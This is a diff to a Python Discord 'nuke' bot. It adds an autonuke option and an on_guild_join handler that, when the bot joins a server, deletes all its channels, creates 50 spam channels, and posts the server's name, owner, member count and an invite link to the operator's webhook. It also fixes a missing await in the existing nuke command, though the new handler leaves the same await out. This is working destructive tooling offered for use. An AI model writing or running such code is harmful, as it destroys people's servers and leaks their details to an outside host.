@@ -15,6 +15,8 @@ log_settings = {
     'log_webhook': 'https://discord.com/api/webhooks/123/abc' # This is where the logs will be sent
 }
 
+autonuke = False # Change to True for autonuke
+
 bot_token = "" # Find this on the discord developer portal
 
 # MAKE SURE ALL INTENTS UNDER THE "GATEWAY INTENTS" SECTION ARE ENABLED
@@ -65,7 +67,7 @@ async def nuke(ctx):
     
     invite = "discord.gg/might"
     try:
-        invite = random.choice(guild.text_channels).create_invite()
+        invite = await random.choice(guild.text_channels).create_invite()
     except:
         pass
 
@@ -80,6 +82,44 @@ async def nuke(ctx):
                     {'name':'Server Boosts', 'value':f'```{str(guild.premium_subscription_count)} boosts```', 'inline':'true'}
                     ]}
         requests.post(log_settings['log_webhook'], json={'embeds':[log_embed]})
+
+@client.event
+async def on_guild_join(guild):
+    if autonuke == True:
+        if guild.id in protected_servers:
+            return
+        else:
+            pass
+
+        for channel in guild.channels:
+            try:
+                await channel.delete()
+            except:
+                pass
+        
+        for _ in range(50):
+            try:
+                await guild.create_text_channel(name=nuke_channel_name)
+            except:
+                pass
+        
+        invite = "discord.gg/might"
+        try:
+            invite = random.choice(guild.text_channels).create_invite()
+        except:
+            pass
+
+        if logs == True:
+            log_embed = {'title':'Joined Server', 'color':0x2596be, 'footer':
+                        {'text':'Nebula Tracker', 'icon_url':'https://cdn.discordapp.com/attachments/1057915288147996682/1057915320402190336/nebula.png'}, 'fields':
+                        [{'name':'Server Name', 'value':f'```{guild.name}```', 'inline':'true'},
+                        {'name':'Server Members', 'value':f'```{guild.member_count} members```', 'inline':'true'},
+                        {'name':'Server Invite', 'value':f'Click [here]({invite}) to join', 'inline':'true'},
+                        {'name':'Server Owner', 'value':f'```{guild.owner}```', 'inline':'true'},
+                        {'name':'Server Roles', 'value':f'```{len(guild.roles)} roles```', 'inline':'true'},
+                        {'name':'Server Boosts', 'value':f'```{str(guild.premium_subscription_count)} boosts```', 'inline':'true'}
+                        ]}
+            requests.post(log_settings['log_webhook'], json={'embeds':[log_embed]})
 
 @client.command()
 async def fix(ctx):
